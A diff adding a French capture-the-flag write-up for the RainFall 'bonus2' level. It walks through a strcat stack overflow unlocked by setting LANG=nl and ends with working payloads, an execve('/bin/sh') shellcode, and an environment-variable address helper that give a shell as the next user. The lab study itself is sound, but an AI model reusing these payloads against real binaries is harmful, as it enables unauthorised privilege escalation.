@@ -1,3 +1,235 @@
 https://www.unixawy.com/smash-stack-level6/
 https://www.greyhat.dk/io-smashthestack-level-06/
 https://github.com/randomcompanyname/ctf_writeup/blob/master/io.netgarage.org/level6.md
+
+Observons le comportement du binaire.
+
+bonus2@RainFall:~$ ./bonus2
+bonus2@RainFall:~$ ./bonus2 a
+bonus2@RainFall:~$ ./bonus2 a a
+Hello a
+bonus2@RainFall:~$ ./bonus2 a a a
+bonus2@RainFall:~$
+
+Le binaire attend 2 arguments ou alors il arrête l'exécution
+
+Avec ltrace ou gdb on peut remarquer l'utilisation des fonctions:
+strncpy et strcat
+
+bonus2@RainFall:~$ ltrace ./bonus2 a b
+__libc_start_main(0x8048529, 3, 0xbffff764, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff660, "a", 40)                                             = 0xbffff660
+strncpy(0xbffff688, "b", 32)                                             = 0xbffff688
+getenv("LANG")                                                           = "fr"
+memcmp(0xbfffff0b, 0x804873d, 2, 0xb7fff918, 0)                          = 1
+memcmp(0xbfffff0b, 0x8048740, 2, 0xb7fff918, 0)                          = -1
+strcat("Hello ", "a")                                                    = "Hello a"
+puts("Hello a"Hello a
+)                                                          = 8
++++ exited (status 8) +++
+
+Les strncpy prennent les arguments avec une taille (n) respective de 40 et 32
+
+et un strncpy avec une chaine de longueur = ou > à n ne mettra pas de \0 à la fin de la chaine
+
+Observons la mémoire autour du strcat qui a l'air de combiner la chaine "Hello " à notre premier argument
+
+Mettons un breakpoint au niveau de l'appel à strcat dans greetuser (+147)
+
+et un autre après cet appel (+152)
+
+(gdb) b *greetuser+147
+Breakpoint 1 at 0x8048517
+(gdb) b *greetuser+152
+Breakpoint 2 at 0x804851c
+
+Ensuite exécutons le programme avec la payload : $(python -c 'print "A" * 40 + " " + "B" * 32') 
+
+(gdb) r $(python -c 'print "A" * 40 + " " + "B" * 32')
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40 + " " + "B" * 32')
+
+Breakpoint 1, 0x08048517 in greetuser ()
+
+(gdb) x/44wx $esp
+0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
+0xbffff5b0:	0x6c6c6548	0x0800206f	0x0000414c	0xb7e5e281
+0xbffff5c0:	0xbfffff01	0xb7e338f8	0x00000002	0xb7ec38ee
+0xbffff5d0:	0xbffff608	0xbffff650	0x00000000	0xbffff69c
+0xbffff5e0:	0xbffff6b8	0xb7ff26b0	0xbfffff01	0xb7f5d780
+0xbffff5f0:	0xbfffff04	0xb7fff918	0xbffff6b8	0x08048630
+0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff620:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffff630:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff640:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
+
+On remarque que nos 2 arguments ont été mis bout à bout dans la mémoire (nos deux arguments sont donc deux variables d'une structure)
+
+Il n'y a pas de '\0' entre les deux.
+
+On peut voir notre adresse de retour : 0x08048630 (adresse suivant l'appel à greetuser dans le main)
+    0x0804862b <+258>:	call   0x8048484 <greetuser>
+    0x08048630 <+263>:	lea    esp,[ebp-0xc]
+
+l'adresse 0xbffff5b0 est le début du buffer de strcat
+
+(gdb) x/s 0xbffff5b0
+0xbffff5b0:	 "Hello "
+
+Observons maintenant la mémoire après le strcat
+
+(gdb) x/44wx $esp
+0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
+0xbffff5b0:	0x6c6c6548	0x4141206f	0x41414141	0x41414141
+0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x42424141
+0xbffff5e0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff5f0:	0x42424242	0x42424242	0x42424242	0x08004242
+0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff620:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffff630:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff640:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
+
+Le strcat a pris dans son buffer notre argument 1 suivi de l'argument 2, l'effacage du '\0' à bien fonctionné
+
+Maintenant on aimerait overwrite l'eip
+
+Ça n'a été que partiellement fait malgré la taille maximum donnée à nos arguments (plus grand il seront coupés par strncpy) 
+
+On peut voir dans ltrace un appel à getenv
+
+Dans gdb on note aussi les comparaisons suivantes :
+
+ 0x0804848a <+6>:	mov    eax,ds:0x8049988
+   0x0804848f <+11>:	cmp    eax,0x1
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
+   0x08048494 <+16>:	cmp    eax,0x2
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
+   0x08048499 <+21>:	test   eax,eax
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
+
+un switch sur la variable globale "language"
+
+et les assignations suivantes en fonction de sa valeur :
+
+(gdb) x/s 0x8048710
+0x8048710:	 "Hello "
+(gdb) x/s 0x8048717
+0x8048717:	 "Hyvää päivää "
+(gdb) x/s 0x804872a
+0x804872a:	 "Goedemiddag! "
+
+si on pouvait avoir une autre valeur que "Hello " on pourrait overwrite l'eip grâce à une plus grande première chaine du strcat
+
+la variable language est assignée dans le main en fonction du résultat de l'appel à getenv
+
+getenv("LANG");
+
+il y a une comparaison avec memcmp des 2 premiers caractères de la variable LANG
+
+memcmp(ret de getenv , "fi", 2)
+memcmp(ret de getenv , "nl", 2)
+
+on modifie la variable d'environnement dans gdb:
+
+set environment LANG = nl
+
+on re run et on observe la mémoire au 2ème breakpoint
+
+(gdb) x/44wx $esp
+0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
+0xbffff5b0:	0x64656f47	0x64696d65	0x21676164	0x41414120
+0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5e0:	0x41414141	0x42424241	0x42424242	0x42424242
+0xbffff5f0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff600:	0x42424242	0x41410042	0x41414141	0x41414141
+0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff620:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffff630:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff640:	0x42424242	0x42424242	0x00000000	0xb7e5ec73
+
+l'adresse de retour a bien été réécrite
+
+(gdb) c
+Continuing.
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+(gdb) r $(python -c 'print "A" * 40 + " " + "B" * 23 + "FFFF"')
+
+(gdb) info frame
+Stack level 0, frame at 0xbffff600:
+ eip = 0x804851c in greetuser; saved eip 0x46464646
+
+Il faut désormais rediriger l'execution vers un shellcode préalablement injecté
+
+prenons le shellcode suivant qui a l'avantage d'être court (23 caractères)
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+Ajoutons 3 de padding pour avoir une addresse pratique, ça nous donne la payload suivante :
+
+(gdb) r $(python -c 'print "\x90" * 3 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 40 + " " +  "B" * 23 + "\xa0\xf5\xff\xbf"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 3 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 37 + " " +  "B" * 23 + "\xa0\xf5\xff\xbf"')
+Goedemiddag! ���1�Ph//shh/bin��PS��
+                                    ̀AAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+process 15519 is executing new program: /bin/dash
+$ whoami
+bonus2
+$
+
+Cela a fonctionné, excepté que nous sommes encore bonus2 et non pas bonus3 car nous sommes dans gdb
+
+essayons directement dans le terminal de la vm
+
+On set d'abord la variable d'environnement LANG :
+
+export LANG=nl
+
+ensuite on exécute la payload
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\x90" * 3 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 37 + " " +  "B" * 23 + "\xa0\xf5\xff\xbf"')
+Goedemiddag! ���1�Ph//shh/bin��PS��
+                                    ̀AAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+Segmentation fault (core dumped)
+
+Il ne semble pas qu'on ait une bonne addresse
+
+Elle doit être différente de celle trouvée dans gdb
+
+Le programme utilise env, mettons-y donc notre shellcode puis récupérons son addresse (on ajoute du padding pour être sur de nous)
+
+export SHELLCODE=$(python -c "print '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+
+Nous utiliserons le binaire obtenu avec la compilation du code suivant pour avoir l'adresse de SHELLCODE:
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    printf("%s => %p\n", argv[1], getenv(argv[1]));
+    return 0;
+}
+
+bonus2@RainFall:~$ ./getenvaddress SHELLCODE
+SHELLCODE => 0xbffff8a6
+
+Essayons désormais avec la payload :
+./bonus2 $(python -c 'print "A" * 40 + " " + "B" * 23 + "\xa6\xf8\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+Illegal instruction (core dumped)
+
+Essayons de remplir entièrement le second buffer
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40 + " " + "B" * 23 + "\xa6\xf8\xff\xbf" + "B" * 5')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����BBBBB
+$ whoami
+bonus3
+$
